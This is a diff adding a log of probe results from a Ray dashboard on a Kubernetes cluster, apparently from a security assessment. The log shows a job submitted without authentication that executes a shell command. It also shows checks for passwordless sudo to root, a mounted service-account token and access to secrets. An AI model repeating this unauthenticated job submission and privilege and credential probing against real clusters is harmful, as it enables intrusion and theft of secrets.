@@ -1,0 +1,13 @@
+# ray dashboard
+{"version": "4", "ray_version": "2.52.0", "ray_commit": "9527a555280fb9837ce73dabf01559c20656a456", "session_name": "session_2026-09-23_19-26-35_105730_1"} HTTP 200
+{"result": true, "msg": "Node summary fetched.", "data": {"summary": [{"now": 1790216823.762053, "hostname": "rc-kuberay-head-474qq", "ip": "<pod-ip>", "cpu": 10.3, "cpus": [1, 10], "mem": [5368709120, 4204519424, 21.7, 1164189696], "shm": 11395072, "raylet": {"storeStats": {"objectStoreBytesAvai
+[] HTTP 200
+# harmless job submit (echo only) to test unauthenticated code execution
+{"job_id": "sbd-probe-1", "submission_id": "sbd-probe-1"} HTTP 200
+{"logs": "2026-09-23 19:27:05,636\tINFO job_manager.py:568 -- Runtime env is setting up.\nRunning entrypoint for job sbd-probe-1: echo sbd-probe-$(id -u)\nsbd-probe-1000\n"} HTTP 200
+{"type": "SUBMISSION", "job_id": null, "submission_id": "sbd-probe-1", "driver_info": null, "status": "SUCCEEDED", "entrypoint": "echo sbd-probe-$(id -u)", "message": "Job finished successfully.", "error_type": null, "start_time": 1790216825633, "end_time": 1790216826668, "metadata": null, "runtime_
+uid head: uid=1000(ray) gid=100(users) groups=100(users),27(sudo)
+sudo -n id: uid=0(root) gid=0(root) groups=0(root)
+head SA token mounted: ca.crt namespace token 
+head SA: default
+default SA get secrets: no
